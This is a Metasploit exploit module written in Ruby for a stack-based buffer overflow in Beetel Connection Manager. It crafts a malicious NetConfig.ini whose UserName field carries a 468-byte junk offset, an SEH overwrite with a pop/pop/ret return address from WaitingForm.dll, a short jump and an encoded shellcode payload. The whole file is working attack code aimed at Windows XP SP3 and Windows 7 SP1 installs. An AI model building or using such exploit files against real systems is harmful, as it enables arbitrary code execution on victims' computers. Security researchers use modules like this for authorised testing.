require "msf/core"

class Metasploit4 < Msf::Exploit

  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'    => "Beetel Connection Manager NetConfig.ini Buffer 
Overflow",
      'Description' => %q{
        This module exploits a stack-based buffer overflow on Beetel 
Connection Manager. The
        vulnerability exists in the parising of the UserName parameter 
in the NetConfig.ini
        file. The module has been tested successfully on 
PCW_BTLINDV1.0.0B04 over Windows XP
        SP3 and Windows 7 SP1.b
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          "metacom", # Vuln/PoC
          "wvu" # Metasploit
        ],
      'References'     =>
        [
          [ "OSVDB", "98714" ],
          [ "EDB", "28969" ]
        ],
      'Payload'        =>
        {
          "Space"       => 1504,
          "BadChars"    => "\x00\x09\x0a\x0b\x0c\x0d\x20",
          "DisableNops" => true
        },
      'Platform'       => "win",
      'Targets'        =>
        [
          ["PCW_BTLINDV1.0.0B04 (WinXP SP3, Win7 SP1)",
            {
              "Offset" => 468,
              "Ret"    => 0x0105e2f6 # p/p/r (WaitingForm.dll 1.0.0.0)
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Oct 12 2013",
      'DefaultTarget'  => 0
    ))

    register_options([
      OptString.new("FILENAME", [true, "INI file", "NetConfig.ini"]),
      OptString.new("SECTION", [true, "Section name", "Edit Me"])
    ], self.class)
  end

  def exploit
    section = datastore["SECTION"]

    sploit = "[#{section}]\r\n" \
             "UserName=#{shell_popper}"

    file_create(sploit)
  end

  def shell_popper
    junk = rand_text(target["Offset"])
    seh = generate_seh_record(target.ret)
    jump = Rex::Arch::X86.jmp_short(66)
    padding = rand_text(66) # Pad past buffer corruption

    junk << seh << jump << padding << payload.encoded
  end

end
